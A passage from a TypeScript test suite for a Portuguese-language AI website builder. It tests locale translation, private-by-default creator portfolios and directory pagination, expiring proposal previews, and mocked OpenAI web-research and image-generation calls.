 assert.equal((await call('start',{id,requestId:randomUUID(),type:'edit',text:'Traduza tudo',targetLocale:'xx'})).statusCode,400);
 assert.equal((await call('start',{id,requestId:randomUUID(),type:'edit',text:'Traduza tudo',targetLocale:'it'})).statusCode,200);
 assert.equal((await call('run',{id})).statusCode,200);
 const translated=await call('state',{id},undefined,'GET');
 assert.equal(translated.body.project.locale,'it');assert.equal(translated.body.project.version,4);
 assert.equal(requestedLocale,'it');assert.equal(load(translated.body.project.html)('html').attr('lang'),'it');
 assert.equal(load((await call('published',{slug},null,'GET')).body)('html').attr('lang'),'en-GB');
 const restored=await call('restore',{id,version:2});assert.equal(restored.statusCode,200);assert.equal(restored.body.project.locale,'en-GB');assert.equal(load(restored.body.project.html)('html').attr('lang'),'en-GB');
 // Portfolio is private by default, independent of the published site.
 assert.equal((await call('creator-public',{handle:'atelier-ana'},null,'GET')).statusCode,404);
 assert.equal((await call('portfolio-toggle',{id,visible:true})).statusCode,409);
 const profileInput={handle:'atelier-ana',name:'Ateliê Ana',headline:'Web design e estratégia',bio:'Sites profissionais com identidade própria.',city:'Porto Alegre',specialties:'Sites institucionais',whatsapp:'51999999999',contactPublic:false,publicEnabled:false};
 const privateProfile=await call('creator-profile',profileInput);
 assert.equal(privateProfile.statusCode,200);
 assert.equal((await call('creator-public',{handle:'atelier-ana'},null,'GET')).statusCode,404);
 assert.equal((await call('portfolio-toggle',{id,visible:true})).statusCode,200);
 assert.equal((await call('creator-directory',{},null,'GET')).body.creators.length,0);
 assert.equal((await call('creator-profile',{...profileInput,publicEnabled:true,contactPublic:true})).statusCode,200);
 const creatorPage=await call('creator-public',{handle:'atelier-ana'},null,'GET');
 assert.equal(creatorPage.statusCode,200);assert.equal(creatorPage.body.sites.length,1);
 assert.equal(creatorPage.body.creator.contactUrl.includes('wa.me/5551999999999'),true);
 assert.ok(!JSON.stringify(creatorPage.body).includes('cliente@example.com'));
 assert.ok(!JSON.stringify(creatorPage.body).includes(business.services));
 const caption=await call('portfolio-caption',{id,caption:'Site editorial de arquitetura'});
 assert.equal(caption.statusCode,200);
 const publicCaption=await call('creator-public',{handle:'atelier-ana'},null,'GET');
 assert.equal(publicCaption.body.sites[0].description,'Site editorial de arquitetura');
 assert.equal((await call('creator-directory',{},null,'GET')).body.creators.length,1);
 const intruder=await call('portfolio-toggle',{id,visible:false},'outro@example.com');
 assert.equal(intruder.statusCode,404);
 const taken=await call('creator-profile',{...profileInput,name:'Outro profissional',publicEnabled:true},'outro@example.com');
 assert.equal(taken.statusCode,409);
 assert.equal((await call('portfolio-toggle',{id,visible:false})).statusCode,200);
 assert.equal((await call('creator-public',{handle:'atelier-ana'},null,'GET')).body.sites.length,0);
 assert.equal((await call('published',{slug},null,'GET')).statusCode,200);
 assert.equal((await call('creator-profile',{...profileInput,publicEnabled:false})).statusCode,200);
 assert.equal((await call('creator-directory',{},null,'GET')).body.creators.length,0);
 assert.equal((await call('creator-public',{handle:'atelier-ana'},null,'GET')).statusCode,404);
 // The directory paginates without requiring an email or exposing private profiles.
 for(let n=0;n<34;n++){const handle='criador-'+String(n).padStart(2,'0');await db.collection('expressBuilderCreatorDirectory').doc(handle).set({handle,name:'Criador '+n,headline:'Sites',bio:'',city:'',specialties:'',contactUrl:null,url:origin+'/criadores/'+handle});}
 const firstPage=await call('creator-directory',{},null,'GET');
 assert.equal(firstPage.statusCode,200);assert.equal(firstPage.body.creators.length,30);
 assert.ok(firstPage.body.nextCursor);
 const secondPage=await call('creator-directory',{cursor:firstPage.body.nextCursor},null,'GET');
 assert.equal(secondPage.statusCode,200);assert.equal(secondPage.body.creators.length,4);
 assert.equal(secondPage.body.nextCursor,null);
 const proposalId=randomUUID();
 assert.equal((await call('create',{id:proposalId,business,proposal:true})).statusCode,200);
 await call('start',{id:proposalId,type:'generate',proposal:true,requestId:randomUUID()});
 const plan=await call('run',{id:proposalId});
 assert.equal(plan.body.project.job.phase,'images');
 for(let step=0;step<3;step++)assert.equal((await call('run',{id:proposalId})).statusCode,200);
 const proposalProject=(await call('state',{id:proposalId},undefined,'GET')).body.project;
 assert.equal(proposalProject.version,1);
 assert.equal(proposalProject.publishedUrl,undefined);
 assert.equal(proposalProject.proposal,undefined);
 assert.match(proposalProject.message,/foto de destaque/);
 assert.equal((await call('prepare-proposal',{id:proposalId})).statusCode,409);
 db.data.get('expressBuilderProjects/'+proposalId).business.assets=[
   {id:randomUUID(),kind:'photo',width:1536,height:1024,url:imageUrl},
 ];
 const ready=await call('prepare-proposal',{id:proposalId});
 assert.equal(ready.statusCode,200);
 assert.equal(ready.body.project.proposal.version,1);
 const proposalToken=ready.body.project.proposal.url.split('/').pop();
 const preview=await call('proposal',{token:proposalToken},null,'GET');
 assert.equal(preview.statusCode,200);
 assert.match(preview.headers['X-Robots-Tag'],/noindex/);
 assert.match(preview.body,/Proposta de site/);
 db.data.get('expressBuilderProposals/'+proposalToken).expiresAt=Date.now()-1;
 assert.equal((await call('proposal',{token:proposalToken},null,'GET')).statusCode,404);
 assert.equal((await call('prepare-proposal',{id:proposalId},'outra@example.com')).statusCode,404);
 assert.equal((await call('prepare-proposal',{id:proposalId})).statusCode,200);
 }finally{await endpoint.close();delete (globalThis as any).__atlasBuilderTest;}
});

test('OpenAI research uses observed sources, vision and image generation',async()=>{
 const temp=await mkdtemp(path.join(process.cwd(),'.builder-test-'));const out=path.join(temp,'ai.cjs');
 await build({entryPoints:['api/_lib/express-builder-ai.ts'],outfile:out,bundle:true,platform:'node',format:'cjs',packages:'external',logLevel:'silent',plugins:[{name:'assets-fixture',setup(b){b.onResolve({filter:/express-assets\.js$/},args=>({path:args.path,namespace:'assets-fixture'}));b.onLoad({filter:/.*/,namespace:'assets-fixture'},()=>({contents:'export const visualAssetInputs=async()=>[];',loader:'js'}));}}]});
 const ai=createRequire(import.meta.url)(out);
 const originalFetch=globalThis.fetch,oldKey=process.env.OPENAI_API_KEY;
 process.env.OPENAI_API_KEY='mock';
 const message=(value:unknown,annotations:unknown[]=[])=>
  ({type:'message',content:[{type:'output_text',text:JSON.stringify(value),annotations}]});
 const completed=(output:unknown[])=>new Response(JSON.stringify({status:'completed',output}));
 const scenes=['inicio','servicos','sobre','contato'].map(section=>({section,goal:'Informar',entrance:'Imagem ampla',motion:'Aproximação',transition:'Corte leve',effect:'scroll-zoom'}));
 const options={direction:BUILDER_DIRECTIONS[0],instruction:'Valorize a pedra',locale:'pt-BR',references:[{name:'Minha foto',data:'base64-dado',mimeType:'image/png'}]};
 try{
 let request:any;
 globalThis.fetch=async(url:any,init:any)=>{
   assert.equal(url,'https://api.openai.com/v1/responses');
   assert.equal(init.headers.Authorization,'Bearer mock');
   request=JSON.parse(init.body);
   return completed([
     {type:'web_search_call',action:{type:'search',sources:[123,456,789].map(id=>({url:'https://www.pinterest.com/pin/'+id+'/',title:'Pin '+id}))}},
     ...['https://atelier.example/','https://www.atelier.example/outro'].map(url=>({type:'web_search_call',action:{type:'open_page',url}})),
     message({creativePlan:{concept:'Do material ao espaço',heroImagePrompt:'Pedra sob luz lateral',scenes},references:[
       {pinUrl:'https://br.pinterest.com/pin/123/',siteUrl:'https://atelier.example/',insight:'Usar a textura no destaque'},
       {pinUrl:'https://www.pinterest.com/pin/456/',siteUrl:'https://www.atelier.example/outro',insight:'Duplicado'},
       {pinUrl:'https://www.pinterest.com/pin/789/',siteUrl:'https://inventado.example/',insight:'Composição ampla'},
       {pinUrl:'https://www.pinterest.com/pin/999/',insight:'Pin sem evidência'},
     ]}),
   ]);
 };
 const planned=await ai.researchBuilder(business,options);
 assert.equal(request.tools[0].type,'web_search');
 assert.equal(request.input[0].content.filter((block:any)=>block.type==='input_image').length,1);
 assert.equal(planned.creativePlan.scenes.length,4);
 assert.deepEqual(planned.sources.map((source:any)=>source.title),['Pin 123','Pin 789']);
 assert.equal(planned.sources[0].siteUrl,'https://atelier.example/');
 assert.equal(planned.sources[1].siteUrl,undefined);
 assert.match(planned.researchNotice,/2 de 4.*consultados: 1/);
 const storyboard={opening:'Close da pedra',transition:'A câmera recua',nextScene:'A bancada aparece'};
 const projectUrl='https://studio.example/projetos/bancada';
 globalThis.fetch=async()=>completed([
   {type:'web_search_call',action:{type:'search',sources:[{url:projectUrl,title:'Projeto de bancada'}]}},
   message({directions:[{storyboard}],references:[
     {siteUrl:projectUrl,insight:'Continuidade do material'},
     {siteUrl:'https://inventado.example/',insight:'Sem evidência'},
   ]}),
 ]);
 const complementary=await ai.researchBuilder(business,options);
 assert.deepEqual(complementary.directions[0].storyboard,storyboard);
 assert.deepEqual(complementary.sources,[{url:projectUrl,title:'Projeto de bancada',insight:'Continuidade do material'}]);
 assert.match(complementary.researchNotice,/diretamente em sites: 1/);
 globalThis.fetch=async()=>completed([message({creativePlan:{concept:'Plano de segunda etapa',heroImagePrompt:'Foto editorial',scenes}})]);
 assert.equal((await ai.planBuilder(business,options,planned.sources)).concept,'Plano de segunda etapa');
 globalThis.fetch=async()=>new Response('',{status:503});
 assert.equal((await ai.planBuilder(business,options,planned.sources)).scenes.length,4);
 const plannedPrompt=await ai.builderPrompt(business,BUILDER_DIRECTIONS[0],'',origin,[],'Crie o site.',undefined,[],'','pt-BR',{plan:planned.creativePlan,sources:planned.sources,chosenDesign:options.references[0]});
 assert.match(JSON.stringify(plannedPrompt.content),/Do material ao espaço.*Usar a textura no destaque/);
 assert.match(JSON.stringify(plannedPrompt.content),/proposta ESCOLHIDA/);
 globalThis.fetch=async()=>completed([message({url:'https://pinterest.com/pin/999/'})]);
 assert.equal((await ai.researchBuilder(business)).sources.length,0);
 const refs=Array.from({length:5},(_,n)=>({name:'Ref '+n,mimeType:'image/png',data:'base64-'+n}));const prompt=await ai.builderPrompt(business,BUILDER_DIRECTIONS[0],'',origin,refs,'Crie meu site.');assert.equal(prompt.content.filter((c:any)=>c.type==='image').length,4);assert.deepEqual(prompt.content.filter((c:any)=>c.type==='image').map((c:any)=>c.source.data),refs.slice(0,4).map(r=>r.data));
 const englishPrompt=await ai.builderPrompt(business,BUILDER_DIRECTIONS[0],'',origin,[], 'Create the final website.',undefined,[],'','en-GB');
 assert.match(englishPrompt.system,/English \(UK\)/);assert.doesNotMatch(englishPrompt.system,/Português brasileiro correto\./);
 assert.match(englishPrompt.system,/title e meta description/i);
 const png=await sharp({create:{width:80,height:60,channels:3,background:'#667788'}}).png().toBuffer();
 globalThis.fetch=async(_url:any,init:any)=>{
   request=JSON.parse(init.body);
   return completed([{type:'image_generation_call',result:png.toString('base64')}]);
 };
 const photo=await ai.generateBuilderPhoto(business,'Ambiente','16:9');
 assert.equal(photo.mimeType,'image/webp');assert.equal(photo.width,80);
 assert.equal(request.tools[0].type,'image_generation');assert.equal(request.tools[0].quality,'medium');
 assert.equal((await ai.generateBuilderPhoto(business,'Abra o enquadramento','16:9',photo)).width,80);
 assert.match(request.input[0].content[1].image_url,/^data:image\/webp;base64,/);
 assert.equal((await ai.generateDesignMockup(business,options,planned.creativePlan,'Studio',planned.sources)).width,80);
 assert.equal(request.tools[0].size,'1024x1536');
 assert.match(request.instructions,/exatamente três quadros desktop/);
 }finally{globalThis.fetch=originalFetch;if(oldKey===undefined)delete process.env.OPENAI_API_KEY;else process.env.OPENAI_API_KEY=oldKey;await rm(temp,{recursive:true,force:true});}
});

test('OpenAI distinguishes organization verification from API key permissions',async()=>{
 const {openaiResponse,openaiAccessMessage}=await import('../api/_lib/express-openai.ts');
 const previous=globalThis.fetch,oldKey=process.env.OPENAI_API_KEY;
 process.env.OPENAI_API_KEY='mock';
 try{
   globalThis.fetch=async()=>new Response(JSON.stringify({error:{message:'Your organization must be verified to use the model.',code:'unsupported_value'}}),{status:403});
   await assert.rejects(openaiResponse('','test',1000),error=>/verificação da organização/.test(openaiAccessMessage(error)));
   globalThis.fetch=async()=>new Response(JSON.stringify({error:{message:'Missing scopes: model.request',code:'insufficient_permissions'}}),{status:401});
   await assert.rejects(openaiResponse('','test',1000),error=>/permissão da chave/.test(openaiAccessMessage(error)));
 }finally{globalThis.fetch=previous;if(oldKey===undefined)delete process.env.OPENAI_API_KEY;else process.env.OPENAI_API_KEY=oldKey;}
});
